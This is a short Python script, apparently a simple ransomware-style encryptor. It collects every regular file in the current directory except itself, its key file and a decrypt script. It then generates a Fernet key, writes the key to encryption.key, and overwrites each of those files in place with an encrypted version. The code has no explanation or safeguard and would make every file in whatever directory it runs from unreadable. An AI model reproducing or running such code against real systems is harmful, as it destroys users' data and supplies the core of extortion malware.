#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

#add files to files array if file is a file

for file in os.listdir():
	if file == "encrypt.py" or file == "encryption.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

#generate a key and write it to encrpytion.key

key = Fernet.generate_key()

with open("encryption.key", "wb") as encryptionkey:
	encryptionkey.write(key)

#read files and encrypt them with the key

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("Files encrypted")
